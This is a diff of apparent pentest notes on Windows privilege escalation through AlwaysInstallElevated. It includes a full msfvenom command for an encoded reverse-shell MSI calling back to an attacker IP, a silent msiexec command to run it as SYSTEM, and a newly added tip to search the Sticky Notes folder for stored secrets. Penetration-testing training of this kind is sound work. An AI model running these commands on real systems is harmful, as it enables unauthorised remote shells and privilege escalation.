@@ -70,3 +70,7 @@ To check if this permission is enabled or not
 
 If both of these come 0x1 then that means the permissions is allowed.
 If it is allowed then we can install any .msi file with system privelages so now we just need to make a payload from msfvenom like this "msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=2345 --encoder x64/xor --iterations 9 --format msi --out test.msi" and put it in the target box and simply execute it by not trigger the uac and any gui with this "msiexec /quiet /qn /i test.msi" and u get a shell on your listener
+
+## Checking any remaing sticky keys
+
+Sometimes users do put stuff in sticky keys which is stored in C:\Users\USER\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
